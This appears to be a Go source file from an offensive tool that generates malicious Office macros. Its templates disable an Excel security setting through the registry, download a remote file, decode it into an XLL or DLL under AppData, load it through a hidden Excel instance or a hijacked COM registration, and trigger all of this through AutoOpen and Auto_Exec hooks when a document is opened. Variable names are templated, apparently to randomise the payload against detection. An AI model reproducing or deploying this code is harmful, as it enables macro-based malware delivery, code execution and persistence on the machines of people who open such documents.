package Struct

func Remote_Struct() string {
	return `
	{{.Variables.VarNum}}
	Sub {{.Variables.function}}()
	
		{{.Variables.sVersion}} = Application.Version
		Set {{.Variables.wsh}} = CreateObject("WScript.Shell")
	
		{{.Variables.regpathh}} = "HKEY_CURRENT_USER\Software\Microsoft\Office\"
		{{.Variables.regpathhh}} = "\\Excel\\Security\\AccessVBOM"
		{{.Variables.regpath}} = {{.Variables.regpathh}} + {{.Variables.sVersion}} + {{.Variables.regpathhh}}
		{{.Variables.wsh}}.RegWrite {{.Variables.regpath}}, "1", "REG_DWORD"
		Dim {{.Variables.lHapUtwZ}} As String
		Dim {{.Variables.bznabCx}} As String
		Dim {{.Variables.tUyZ}} As String
		{{.Variables.lHapUtwZ}} = Environ("AppData") & "\Microsoft\Excel\"
		VBA.ChDir {{.Variables.lHapUtwZ}}
		Dim {{.Variables.RZIVyI}} As String
		Dim {{.Variables.fVqggL}} As String
		Dim {{.Variables.AFjZ}} As Object
	
		
		{{.Variables.RZIVyI}} = "{{.Variables.URL}}{{.Variables.OutFile}}"
		{{.Variables.fVqggL}} = "{{.Variables.OutFile}}"
		Set {{.Variables.AFjZ}} = CreateObject("Microsoft.XMLHTTP")
		{{.Variables.AFjZ}}.Open "GET", {{.Variables.RZIVyI}}, False
		{{.Variables.AFjZ}}.send
	
		If {{.Variables.AFjZ}}.Status = 200 Then
			Set {{.Variables.jfIbu}} = CreateObject("ADODB.Stream")
			{{.Variables.jfIbu}}.Open
			{{.Variables.jfIbu}}.Type = 1
			{{.Variables.jfIbu}}.Write {{.Variables.AFjZ}}.responseBody
			{{.Variables.jfIbu}}.SaveToFile {{.Variables.fVqggL}}, 2
			{{.Variables.jfIbu}}.Close
		End If
		
	
		{{.Variables.bznabCx}} = {{.Variables.lHapUtwZ}} & {{.Variables.fVqggL}}
		{{.Variables.lHapUtwZZ}} = {{.Variables.lHapUtwZ}} + "{{.Variables.XLLName}}"
	
		Dim {{.Variables.strBase64}} As String
		Dim {{.Variables.llHapUtwZ}} As String
		{{.Variables.llHapUtwZ}} = Environ("AppData") & "\Microsoft\Excel\"
		Dim {{.Variables.strFilename}} As String: {{.Variables.strFilename}} = {{.Variables.llHapUtwZ}} + "{{.Variables.OutFile}}"
		Dim {{.Variables.strFileContent}} As String

		Dim iFile As Integer: iFile = FreeFile
        Open {{.Variables.strFilename}} For Input As #iFile
        {{.Variables.strBase64}} = Input(LOF(iFile), iFile)
        Close #iFile
	
		Const {{.Variables.UseBinaryStreamType}} = 1
		Const {{.Variables.SaveWillCreateOrOverwrite}} = 2
		
		Dim {{.Variables.streamOutput}}: Set {{.Variables.streamOutput}} = CreateObject("ADODB.Stream")
		Dim {{.Variables.xmlDoc}}: Set {{.Variables.xmlDoc}} = CreateObject("Microsoft.XMLDOM")
		Dim {{.Variables.xmlElem}}: Set {{.Variables.xmlElem}} = {{.Variables.xmlDoc}}.createElement("tmp")
		
		{{.Variables.xmlElem}}.dataType = "bin.base64"
		{{.Variables.xmlElem}}.Text = {{.Variables.strBase64}}
		{{.Variables.streamOutput}}.Open
		{{.Variables.streamOutput}}.Type = {{.Variables.UseBinaryStreamType}}
		{{.Variables.streamOutput}}.Write = {{.Variables.xmlElem}}.nodeTypedValue
		{{.Variables.streamOutput}}.SaveToFile {{.Variables.lHapUtwZZ}}, {{.Variables.SaveWillCreateOrOverwrite}}
		
		Set {{.Variables.streamOutput}} = Nothing
		Set {{.Variables.xmlDoc}} = Nothing
		Set {{.Variables.xmlElem}} = Nothing
	
		Set {{.Variables.oXLD}} = CreateObject("Excel.Application")
		{{.Variables.oXLD}}.Visible = False
		{{.Variables.oXLD}}.RegisterXLL ({{.Variables.lHapUtwZ}} + "{{.Variables.XLLName}}")
	End Sub
`

}

func Fake_COM() string {
	return `
		With CreateObject("WScript.Shell")
		{{.Variables.appdata}} = .ExpandEnvironmentStrings("%APPDATA%")
	End With

	{{.Variables.contents}} = "{{.Variables.b64}} "

	
	{{.Variables.outputFile}} = {{.Variables.appdata}} & "\Microsoft\Excel\" & "{{.Variables.DLLName}}"

	Set {{.Variables.oXML}} = CreateObject("Msxml2.DOMDocument")
	Set {{.Variables.oNode}} = {{.Variables.oXML}}.CreateElement("base64")
	{{.Variables.oNode}}.dataType = "bin.base64"
	{{.Variables.oNode}}.Text = {{.Variables.contents}}
	
	Set {{.Variables.BinaryStream}} = CreateObject("ADODB.Stream")
	{{.Variables.BinaryStream}}.Type = 1 'adTypeBinary
	{{.Variables.BinaryStream}}.Open
	{{.Variables.BinaryStream}}.Write {{.Variables.oNode}}.nodeTypedValue
	{{.Variables.BinaryStream}}.SaveToFile {{.Variables.outputFile}}


	Set {{.Variables.wsh}} = CreateObject ("WScript.Shell")
	{{.Variables.wsh}}.RegWrite "HKCR\{{.Variables.COM}}\", ""
	{{.Variables.wsh}}.RegWrite "HKCR\{{.Variables.COM}}\CLSID\", ""
	{{.Variables.wsh}}.RegWrite "HKEY_CLASSES_ROOT\{{.Variables.COM}}\CLSID\","{{.Variables.CLSID}}", "REG_SZ"
	{{.Variables.wsh}}.RegWrite "HKEY_CLASSES_ROOT\CLSID\{{.Variables.CLSID}}\","InprocServer32"
	{{.Variables.wsh}}.RegWrite "HKEY_CLASSES_ROOT\CLSID\{{.Variables.CLSID}}\InprocServer32\",{{.Variables.outputFile}}, "REG_SZ"
	Set {{.Variables.ComNAME}} = CreateObject ("{{.Variables.COM}}")
	
`
}

func Excel_Startup() string {
	return `
	Sub Auto_Exec()
		{{.Variables.function}}()
	End Sub

	Sub AutoExec()
		{{.Variables.function}}()
	End Sub
	`

}
func Word_Startup() string {
	return `
	Sub Auto_Open()
		{{.Variables.function}}()
	End Sub

	Sub AutoOpen()
		{{.Variables.function}}()
	End Sub
	`
}
